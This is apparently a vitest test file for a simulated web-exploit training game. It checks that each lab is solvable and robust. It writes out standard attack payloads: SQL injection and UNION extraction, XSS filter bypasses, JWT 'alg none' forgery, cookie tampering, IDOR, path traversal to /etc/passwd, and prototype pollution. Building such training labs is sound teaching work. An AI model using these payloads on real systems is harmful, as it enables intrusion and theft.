import { describe, expect, it } from 'vitest';
import {
  LABS, TRACKS, TRACK_MAX, WEBLAB_MAX_POINTS, inspectorFor, labById, labSlug, labTemplate, lockedReason, runLab,
} from '../../src/games/weblab/index.js';
import { WORDLIST } from '../../src/games/weblab/labs/jwtWeakSecret.js';
import { scanVectors, weakSanitise } from '../../src/games/weblab/labs/xssFilter.js';
import { decodeToken, signToken } from '../../src/games/weblab/token.js';

const SECRET = 'unit-test-secret-unit-test-secret-0123456789';
const TEAM = '0123456789abcdef01234567';
const FLAG = 'CTF{weblab_unit_flag_0123456789ab}';

const mk = (method, path, { headers = {}, cookies = {}, body = '' } = {}) => ({ method, path, headers, cookies, body });
const play = (id, request, teamId = TEAM) => runLab(labById(id), { secret: SECRET, teamId, flag: FLAG, request });
const tpl = (id, teamId = TEAM) => labTemplate(labById(id), { secret: SECRET, teamId });
const data = (response) => JSON.parse(response.body);
const post = (id, path, object, extra = {}) => play(id, mk('POST', path, { ...extra, body: JSON.stringify(object) }));
const bearerOf = (token) => ({ authorization: `Bearer ${token}` });
const cookieValue = (response, name) => response.setCookies.find((cookie) => cookie.name === name)?.value;

describe('registry, tracks and points', () => {
  it('has four tracks, nine plus one labs, unique ids, a boss per track and fixed points', () => {
    expect(TRACKS.map((track) => track.id)).toEqual(['easy', 'medium', 'hard', 'insane']);
    expect(LABS.length).toBe(10);
    expect(new Set(LABS.map((lab) => lab.id)).size).toBe(LABS.length);
    for (const track of TRACKS) {
      expect(track.labs.filter((lab) => lab.boss)).toHaveLength(1);
      expect(track.labs.at(-1).boss).toBe(true);
      expect(track.company.name).toBeTruthy();
    }
    for (const lab of LABS) { expect(Number.isInteger(lab.points) && lab.points > 0).toBe(true); }
  });

  it('documents the maximum per track and overall (these numbers are in docs/WEB_EXPLOIT_LAB.md)', () => {
    expect(TRACK_MAX).toEqual({ easy: 120, medium: 300, hard: 550, insane: 500 });
    expect(WEBLAB_MAX_POINTS).toBe(1470);
  });

  it('points rise with difficulty: every lab of a harder track is worth at least as much as an easier one', () => {
    const minOf = (id) => Math.min(...LABS.filter((lab) => lab.track === id).map((lab) => lab.points));
    const maxOf = (id) => Math.max(...LABS.filter((lab) => lab.track === id).map((lab) => lab.points));
    expect(minOf('hard')).toBeGreaterThanOrEqual(maxOf('easy'));
    expect(minOf('medium')).toBeGreaterThanOrEqual(minOf('easy'));
    expect(maxOf('insane')).toBeGreaterThan(maxOf('hard'));
  });

  it('the insane lab has no hints, other labs have three', () => {
    expect(labById('chain-vault').hints).toEqual([]);
    for (const lab of LABS.filter((l) => l.track !== 'insane')) { expect(lab.hints).toHaveLength(3); }
  });

  it('bosses are locked until their track mates (insane until the hard boss) are cleared', () => {
    expect(lockedReason(labById('idor-statements'), new Set())).toMatch(/Clear first/);
    expect(lockedReason(labById('idor-statements'), new Set(['sqli-login', 'cookie-tamper']))).toBeNull();
    expect(lockedReason(labById('chain-vault'), new Set(['sqli-union']))).toMatch(/Voucher Rush/);
    expect(lockedReason(labById('chain-vault'), new Set(['race-refill']))).toBeNull();
    expect(lockedReason(labById('sqli-login'), new Set())).toBeNull();
  });

  it('the request inspector gets more powerful as labs are cleared', () => {
    expect(inspectorFor(0).unlocked).toEqual(['edit']);
    expect(inspectorFor(1).unlocked).toContain('decode');
    expect(inspectorFor(3).unlocked).toContain('history');
    expect(inspectorFor(10).level).toBe(5);
    expect(inspectorFor(0).next).toEqual({ id: 'decode', label: 'Decoder', solvesNeeded: 1 });
    expect(inspectorFor(10).next).toBeNull();
  });
});

describe('every lab is solvable through its intended exploit', () => {
  it('sqli-login: comment out the password check as the teller, or match the admin role', () => {
    const staff = play('sqli-login', mk('GET', '/staff'));
    const admin = staff.page.blocks.find((block) => block.t === 'table').rows[0][0];
    const viaComment = post('sqli-login', '/login', { username: `${admin}'--`, password: 'x' });
    expect(viaComment.exploited).toBe(true);
    expect(viaComment.body).toContain(FLAG);
    const viaRole = post('sqli-login', '/login', { username: "x' OR role='admin' -- ", password: '' });
    expect(viaRole.exploited).toBe(true);
    // The tautology logs you in as the first customer only: no flag.
    const tautology = post('sqli-login', '/login', { username: "' OR 1=1 -- ", password: '' });
    expect(tautology.status).toBe(200);
    expect(tautology.exploited).toBe(false);
    expect(tautology.body).not.toContain(FLAG);
    // Verbose database errors are part of the game.
    expect(post('sqli-login', '/login', { username: "'", password: '' }).status).toBe(500);
    expect(post('sqli-login', '/login', { username: 'nobody', password: 'x' }).status).toBe(401);
  });

  it('cookie-tamper: decode the prefs cookie, flip admin, send it back', () => {
    const start = tpl('cookie-tamper');
    const prefs = JSON.parse(Buffer.from(start.cookies.prefs, 'base64').toString());
    expect(prefs.admin).toBe(false);
    expect(play('cookie-tamper', mk('GET', '/vault', { cookies: start.cookies })).status).toBe(403);
    const forged = Buffer.from(JSON.stringify({ ...prefs, admin: true })).toString('base64');
    const response = play('cookie-tamper', mk('GET', '/vault', { cookies: { prefs: forged } }));
    expect(response.exploited).toBe(true);
    expect(response.body).toContain(FLAG);
    expect(play('cookie-tamper', mk('GET', '/vault', { cookies: { prefs: '!!!' } })).status).toBe(400);
    expect(play('cookie-tamper', mk('GET', '/vault')).status).toBe(400);
  });

  it('idor-statements: walking ids reaches the vault manager statement', () => {
    const start = tpl('idor-statements');
    const own = Number(start.path.split('/').pop());
    expect(play('idor-statements', mk('GET', start.path)).exploited).toBe(false);
    expect(play('idor-statements', mk('GET', start.path, { cookies: { uid: 'u_wrong' } })).status).toBe(401);
    let found = null;
    for (let id = own - 12; id <= own + 12; id += 1) {
      const response = play('idor-statements', mk('GET', `/api/statements/${id}`, { cookies: start.cookies }));
      if (response.exploited) { found = response; }
    }
    expect(found).not.toBeNull();
    expect(found.body).toContain(FLAG);
    expect(data(found).owner).toBe('vault_manager');
    // The list endpoint shows only the caller's own statements and never the flag.
    expect(play('idor-statements', mk('GET', '/api/statements', { cookies: start.cookies })).body).not.toContain(FLAG);
  });

  it('path-traversal: ....// and double encoding get past the filter; a plain ../ does not', () => {
    const open = (file) => play('path-traversal', mk('GET', `/menu?file=${file}`));
    expect(open('specials.txt').exploited).toBe(false);
    expect(open('../../../etc/passwd').body).not.toContain('root:x');
    const config = open('....//....//....//srv/app/config.ini');
    expect(config.body).toContain('recipe_backup=');
    const keyPath = /recipe_backup=(\/srv\/backups\/[a-z0-9.-]+)/.exec(config.body)[1];
    const viaNesting = open(`....//....//....//${keyPath.slice(1)}`);
    expect(viaNesting.exploited).toBe(true);
    expect(viaNesting.body).toContain(FLAG);
    const encoded = '%252e%252e%252f'.repeat(3);
    expect(open(`${encoded}${keyPath.slice(1)}`).exploited).toBe(true);
    expect(open('....//....//....//etc/passwd').body).toContain('root:x');
  });

  it('xss-filter: judged by string rules, only a real bypass reports code execution', () => {
    const review = (comment) => play('xss-filter', mk('GET', `/reviews?comment=${encodeURIComponent(comment)}`));
    expect(review('Great crust!').exploited).toBe(false);
    expect(review('<script>alert(1)</script>').exploited).toBe(false);
    expect(review('<img src=x onerror=alert(1)>').exploited).toBe(false);
    expect(review('<a href="javascript:alert(1)">x</a>').exploited).toBe(false);
    for (const payload of ['<ScRipt>alert(1)</ScRipt>', '<svg onload=alert(1)>', '<img src=x ononerrorerror=alert(1)>', '<a href="JaVaScRiPt:alert(1)">x</a>', '<body/onpageshow=alert(1)>']) {
      const response = review(payload);
      expect(response.exploited, payload).toBe(true);
      expect(response.body).toContain(FLAG);
    }
    expect(weakSanitise('<script>x</script>')).toBe('x');
    expect(scanVectors('<p>hi</p>')).toEqual([]);
    // The page is data only: the markup the player typed is inside a code block, never a raw html block.
    const shown = review('<svg onload=alert(1)>').page.blocks.find((block) => block.t === 'code');
    expect(shown.text).toContain('<svg onload=alert(1)>');
  });

  it('jwt-none: a token with alg none and role chef opens the freezer; a bad signature does not', () => {
    const login = post('jwt-none', '/api/login', { username: 'guest', password: 'guest' });
    const { token } = data(login);
    expect(decodeToken(token).payload.role).toBe('guest');
    expect(play('jwt-none', mk('GET', '/api/kitchen/freezer', { headers: bearerOf(token) })).status).toBe(403);
    const none = signToken({ sub: 'x', role: 'chef' }, '', 'none');
    const opened = play('jwt-none', mk('GET', '/api/kitchen/freezer', { headers: bearerOf(none) }));
    expect(opened.exploited).toBe(true);
    expect(opened.body).toContain(FLAG);
    const wrong = signToken({ sub: 'x', role: 'chef' }, 'not-the-secret');
    expect(play('jwt-none', mk('GET', '/api/kitchen/freezer', { headers: bearerOf(wrong) })).status).toBe(401);
    expect(play('jwt-none', mk('GET', '/api/kitchen/freezer')).status).toBe(401);
  });

  it('sqli-union: count columns, list tables, then read the hidden table', () => {
    const search = (term) => play('sqli-union', mk('GET', `/search?q=${encodeURIComponent(term)}`));
    expect(data(search('Ada')).count).toBe(1);
    expect(search('Gus').body).not.toContain('Gus Lambda');
    expect(search("x' ORDER BY 4 -- ").status).toBe(500);
    expect(search("x' ORDER BY 3 -- ").status).toBe(200);
    const tables = data(search("zzz' UNION SELECT 1, table_name, 1 FROM information_schema.tables -- "));
    const secretTable = tables.results.map((row) => row.name).find((name) => name.startsWith('internal_'));
    expect(secretTable).toBeTruthy();
    const columns = data(search(`zzz' UNION SELECT 1, column_name, 1 FROM information_schema.columns WHERE table_name='${secretTable}' -- `));
    expect(columns.results.map((row) => row.name)).toContain('note');
    const loot = search(`zzz' UNION SELECT 1, note, 1 FROM ${secretTable} -- `);
    expect(loot.exploited).toBe(true);
    expect(loot.body).toContain(FLAG);
  });

  it('jwt-weak-secret: crack the dictionary secret, sign an admin token', () => {
    const { token } = data(post('jwt-weak-secret', '/api/login', { username: 'intern', password: 'intern' }));
    expect(play('jwt-weak-secret', mk('GET', '/api/records/audit', { headers: bearerOf(token) })).status).toBe(403);
    const none = signToken({ sub: 'x', role: 'admin' }, '', 'none');
    expect(play('jwt-weak-secret', mk('GET', '/api/records/audit', { headers: bearerOf(none) })).status).toBe(401);
    const cracked = data(post('jwt-weak-secret', '/tools/crack', { token }));
    expect(cracked.found).toBe(true);
    expect(WORDLIST).toContain(cracked.secret);
    const forged = data(post('jwt-weak-secret', '/tools/sign', { secret: cracked.secret, payload: '{"sub":"x","role":"admin"}' })).token;
    const opened = play('jwt-weak-secret', mk('GET', '/api/records/audit', { headers: bearerOf(forged) }));
    expect(opened.exploited).toBe(true);
    expect(opened.body).toContain(FLAG);
    expect(post('jwt-weak-secret', '/tools/crack', { token: 'garbage' }).status).toBe(400);
    expect(post('jwt-weak-secret', '/tools/sign', { secret: 'x', payload: 'not json' }).status).toBe(400);
  });

  it('race-refill: one redeem is never enough, a parallel burst is, a tampered wallet is rejected', () => {
    const start = tpl('race-refill');
    const voucher = JSON.parse(start.body).code;
    const home = play('race-refill', mk('GET', '/pharmacy'));
    expect(home.body).toContain(voucher);
    const redeem = (cookies, parallel) => post('race-refill', '/redeem', { code: voucher, parallel }, { cookies });
    const once = redeem(start.cookies, 1);
    expect(data(once).balance).toBe(20);
    const wallet = { wallet: cookieValue(once, 'wallet') };
    expect(redeem(wallet, 1).status).toBe(409);
    expect(redeem(wallet, 8).status).toBe(409);
    const buy = (cookies) => post('race-refill', '/buy', { item: 'audit-report' }, { cookies });
    expect(buy(wallet).status).toBe(402);
    const burst = redeem(start.cookies, 6);
    expect(data(burst).balance).toBe(120);
    const bought = buy({ wallet: cookieValue(burst, 'wallet') });
    expect(bought.exploited).toBe(true);
    expect(bought.body).toContain(FLAG);
    // The pool limit caps the burst; absurd values are clamped, not trusted.
    expect(data(redeem(start.cookies, 9999)).balance).toBe(160);
    expect(data(redeem(start.cookies, -4)).balance).toBe(20);
    // Forged balance: the cookie is signed.
    const forged = `500.0.${start.cookies.wallet.split('.')[2]}`;
    expect(buy({ wallet: forged }).status).toBe(401);
    expect(buy({}).status).toBe(401);
  });

  it('chain-vault: IDOR leaks the key, a forged admin token opens exports, traversal reads the vault', () => {
    const start = tpl('chain-vault');
    const own = Number(start.path.split('/').pop());
    let devKey = null;
    for (let id = own; id < own + 8; id += 1) {
      const profile = data(play('chain-vault', mk('GET', `/api/staff/${id}`, { cookies: start.cookies })));
      const found = /still (nova-[0-9a-f]+) on prod/.exec(profile.bio ?? '');
      if (found) { devKey = found[1]; }
    }
    expect(devKey).toBeTruthy();
    const { token } = data(post('chain-vault', '/api/login', { username: 'intern', password: 'intern' }));
    expect(play('chain-vault', mk('GET', '/api/admin/exports', { headers: bearerOf(token) })).status).toBe(403);
    const admin = data(post('chain-vault', '/tools/sign', { secret: devKey, payload: '{"sub":"intern","role":"admin"}' })).token;
    const exportsCall = (file) => play('chain-vault', mk('GET', file ? `/api/admin/exports?file=${file}` : '/api/admin/exports', { headers: bearerOf(admin) }));
    expect(data(exportsCall()).files).toContain('readme.txt');
    const readme = data(exportsCall('readme.txt')).content;
    const vaultPath = /(\/srv\/vault\/master-[0-9a-f]+\.key)/.exec(readme)[1];
    expect(exportsCall('../../srv/vault/x').status).toBe(404);
    const loot = exportsCall(`....//....//${vaultPath.slice(1)}`);
    expect(loot.exploited).toBe(true);
    expect(loot.body).toContain(FLAG);
    expect(play('chain-vault', mk('GET', '/api/admin/exports?file=....//....//srv/vault/anything')).status).toBe(401);
  });
});

describe('determinism and per-team variation', () => {
  it('the same team gets byte-identical worlds and responses on every call', () => {
    for (const lab of LABS) {
      const request = tpl(lab.id);
      expect(tpl(lab.id)).toEqual(request);
      expect(play(lab.id, request)).toEqual(play(lab.id, request));
    }
  });

  it('different teams get different secrets, ids and names', () => {
    const teams = ['a', 'b', 'c', 'd', 'e', 'f'].map((letter) => letter.repeat(24));
    const distinct = (id, pick) => new Set(teams.map((team) => pick(tpl(id, team), team))).size;
    expect(distinct('idor-statements', (request) => request.path)).toBeGreaterThan(3);
    expect(distinct('race-refill', (request) => request.cookies.wallet)).toBeGreaterThan(3);
    expect(distinct('race-refill', (request) => request.body)).toBeGreaterThan(3);
    expect(distinct('chain-vault', (request) => request.cookies.sid)).toBeGreaterThan(3);
    const staff = (team) => JSON.stringify(play('sqli-login', mk('GET', '/staff'), team).page.blocks);
    expect(new Set(teams.map(staff)).size).toBe(teams.length);
    const searchTable = (team) => {
      const out = play('sqli-union', mk('GET', `/search?q=${encodeURIComponent("zzz' UNION SELECT 1, table_name, 1 FROM information_schema.tables -- ")}`), team);
      return out.body;
    };
    expect(new Set(teams.map(searchTable)).size).toBe(teams.length);
  });

  it("another team's exploit data does not work on my world", () => {
    const other = 'f'.repeat(24);
    const admin = (team) => play('sqli-login', mk('GET', '/staff'), team).page.blocks.find((b) => b.t === 'table').rows[0][0];
    expect(admin(TEAM)).not.toBe(admin(other));
    const theirs = tpl('idor-statements', other);
    expect(play('idor-statements', mk('GET', theirs.path, { cookies: theirs.cookies })).status).toBe(401);
    const theirWallet = tpl('race-refill', other);
    expect(play('race-refill', mk('POST', '/redeem', { cookies: theirWallet.cookies, body: theirWallet.body })).status).toBe(401);
  });
});

describe('no secret leakage without the exploit', () => {
  const probes = [
    mk('GET', '/'), mk('GET', '/login'), mk('GET', '/staff'), mk('GET', '/vault'), mk('GET', '/rewards'), mk('GET', '/menu?file=specials.txt'),
    mk('GET', '/menu?file=../../etc/passwd'), mk('GET', '/reviews?comment=hello'), mk('GET', '/search?q=a'), mk('GET', '/search?q=%25'),
    mk('GET', '/pharmacy'), mk('GET', '/api/me'), mk('GET', '/api/admin/exports'), mk('GET', '/api/statements'), mk('GET', '/api/statements/1'),
    mk('POST', '/login', { body: '{"username":"a","password":"b"}' }), mk('POST', '/api/login', { body: '{"username":"guest","password":"guest"}' }),
    mk('POST', '/redeem', { body: '{"code":"x"}' }), mk('DELETE', '/anything'), mk('OPTIONS', '/'), mk('HEAD', '/'),
  ];

  it('templates, summaries and ordinary requests never contain the flag or its hash', () => {
    for (const lab of LABS) {
      const text = JSON.stringify({ ...lab, handle: undefined, template: undefined });
      expect(text).not.toContain('CTF{');
      const start = tpl(lab.id);
      expect(JSON.stringify(start)).not.toContain(FLAG);
      const first = play(lab.id, start);
      expect(first.exploited).toBe(false);
      expect(JSON.stringify(first)).not.toContain(FLAG);
      for (const probe of probes) {
        const response = play(lab.id, probe);
        expect(JSON.stringify(response), `${lab.id} ${probe.method} ${probe.path}`).not.toContain(FLAG);
        expect(response.exploited).toBe(false);
      }
    }
  });

  it('a lab that crashes returns a generic 500 and never an exception message', () => {
    const broken = { id: 'x', handle() { throw new Error('secret internals'); } };
    const out = runLab(broken, { secret: SECRET, teamId: TEAM, flag: FLAG, request: mk('GET', '/') });
    expect(out.status).toBe(500);
    expect(out.body).toBe('Internal Server Error');
  });

  it('slugs are stable and prefixed', () => {
    expect(labSlug('sqli-login')).toBe('weblab-sqli-login');
  });
});

describe('malicious input is bounded', () => {
  const huge = 'A'.repeat(200_000);
  const bombs = [
    huge,
    `${'a'.repeat(40_000)}!`,
    '('.repeat(5000),
    "'".repeat(3000),
    "' OR ".repeat(2000),
    '%'.repeat(10_000),
    '%25'.repeat(5000),
    '<'.repeat(4000),
    `<a ${'x='.repeat(2000)}>`,
    `<script>${'<script>'.repeat(1000)}`,
    `${'....//'.repeat(2000)}etc/passwd`,
    '../'.repeat(5000),
    `{"a":${'['.repeat(3000)}`,
    '\u0000\ud800￿'.repeat(500),
    '__proto__', '{"__proto__":{"admin":true}}', 'constructor',
  ];
  const manyHeaders = Object.fromEntries(Array.from({ length: 200 }, (_, index) => [`h${index}`, 'v'.repeat(1000)]));

  it('every lab survives every bomb quickly, in every request slot, with a bounded answer', () => {
    const start = Date.now();
    for (const lab of LABS) {
      for (const bomb of bombs) {
        const requests = [
          mk('GET', `/${bomb}`), mk('GET', `/menu?file=${bomb}&q=${bomb}&comment=${bomb}`), mk('POST', '/login', { body: bomb }),
          mk('POST', '/api/login', { body: bomb, headers: { authorization: `Bearer ${bomb}` } }),
          mk('GET', '/vault', { cookies: { prefs: bomb, uid: bomb, wallet: bomb, sid: bomb } }),
          mk('POST', '/redeem', { body: `{"code":"${bomb}","parallel":${bomb.slice(0, 5).replace(/\D/g, '') || 1}}` }),
          mk('GET', '/api/admin/exports?file=' + bomb, { headers: { authorization: `Bearer ${bomb}`, ...manyHeaders } }),
        ];
        for (const request of requests) {
          const out = play(lab.id, request);
          expect(Number.isInteger(out.status)).toBe(true);
          expect(out.body.length).toBeLessThanOrEqual(8000);
          expect(out.exploited).toBe(false);
        }
      }
    }
    expect(Date.now() - start).toBeLessThan(8000);
  });

  it('prototype pollution attempts change nothing', () => {
    play('sqli-login', mk('POST', '/login', { body: '{"__proto__":{"admin":true},"username":"a","password":"b"}' }));
    play('cookie-tamper', mk('GET', '/vault', { cookies: { prefs: Buffer.from('{"__proto__":{"admin":true}}').toString('base64') } }));
    expect({}.admin).toBeUndefined();
    const out = play('cookie-tamper', mk('GET', '/vault', { cookies: { prefs: Buffer.from('{"__proto__":{"admin":true}}').toString('base64') } }));
    expect(out.exploited).toBe(false);
  });

  it('the xss scanner is linear: pathological markup stays fast and capped', () => {
    const start = Date.now();
    const vectors = scanVectors(`${'<a onclick=x '.repeat(500)}`);
    expect(vectors.length).toBeLessThanOrEqual(5);
    scanVectors('<'.repeat(100_000));
    scanVectors(`<a ${'b'.repeat(100_000)}`);
    expect(Date.now() - start).toBeLessThan(500);
  });

  it('player text is never executed as code', () => {
    globalThis.__weblabPwned = false;
    play('sqli-login', mk('POST', '/login', { body: '{"username":"x\' OR globalThis.__weblabPwned=1 -- ","password":""}' }));
    play('xss-filter', mk('GET', '/reviews?comment=<img src=x onload=globalThis.__weblabPwned=true>'));
    expect(globalThis.__weblabPwned).toBe(false);
  });
});
